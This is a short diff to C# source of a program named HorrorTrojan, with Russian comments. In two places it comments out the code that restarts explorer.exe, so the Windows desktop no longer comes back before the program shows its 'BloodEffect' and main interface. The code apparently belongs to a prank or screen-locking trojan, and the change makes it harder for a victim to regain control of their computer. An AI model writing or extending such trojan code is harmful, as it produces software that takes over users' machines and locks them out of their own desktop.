@@ -31,12 +31,8 @@ namespace HorrorTrojan
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
                     
-                    // ===== ЗАПУСКАЕМ РАБОЧИЙ СТОЛ =====
-                    try
-                    {
-                        Process.Start("explorer.exe");
-                    }
-                    catch { }
+                    // ===== ЗАПУСК EXPLORER УБРАН! =====
+                    // try { Process.Start("explorer.exe"); } catch { }
                     
                     BloodEffect blood = new BloodEffect();
                     MainInterface ui = new MainInterface();
@@ -74,11 +70,8 @@ namespace HorrorTrojan
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
                     
-                    try
-                    {
-                        Process.Start("explorer.exe");
-                    }
-                    catch { }
+                    // ===== ЗАПУСК EXPLORER УБРАН! =====
+                    // try { Process.Start("explorer.exe"); } catch { }
                     
                     BloodEffect blood = new BloodEffect();
                     MainInterface ui = new MainInterface();
